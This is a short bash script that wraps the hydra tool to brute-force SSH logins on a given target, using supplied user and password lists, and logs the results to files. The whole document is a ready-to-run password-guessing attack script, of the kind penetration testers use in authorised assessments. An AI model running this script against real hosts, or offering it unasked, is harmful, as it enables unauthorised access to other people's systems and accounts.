#!/usr/bin/env bash
if [ $# -ne 3 ]; then
    echo "[*] SSH hydra bruteforce"
    echo "[*] Usage : $0 <target> <user_file> <pass_file>"
    exit 0
fi

hydra -f -V -t 1 -L $2 -P $3 -s 22 $1 ssh > >(tee -a $1.hydra.stdout.log) 2> >(tee -a $1.hydra.stderr.log >&2)
